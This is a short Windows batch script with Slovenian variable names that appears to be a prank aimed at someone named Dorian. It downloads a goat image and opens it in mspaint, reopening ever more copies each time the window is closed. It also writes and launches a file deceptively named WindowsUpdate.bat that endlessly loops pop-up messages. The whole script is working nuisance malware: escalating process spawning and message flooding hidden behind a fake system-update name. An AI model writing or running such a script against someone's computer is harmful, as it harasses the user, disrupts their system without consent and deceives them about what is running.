REM Specify the title of the window to monitor
@echo off
set program=mspaint
set nov=WindowsUpdate.bat
set pot_do=C:\Program Files (x86)\
curl -o koza.jpg https://www.veterinacerknica.si/wp-content/uploads/2018/10/goatpet.jpg
start "ScreenSketch" %program% ".\koza.jpg"
echo @echo off >> %nov%
echo :start >> %nov%
echo msg * "Dobetr dan Dorian." >> %nov%
echo goto :start >> %nov%
set /a stevec=1

Start /min WindowsUpdate.bat


:LOOP
REM Check if the process is running
tasklist | findstr "%program%" >nul
if errorlevel 1 (
    REM If not running, start another instance
    for /l %%i in (1, 1, %stevec%) do (
        start "" %program% ".\koza.jpg"
    )
    REM Increment the counter
    set /a stevec+=1
) else (
    echo Program is running.
)
goto LOOP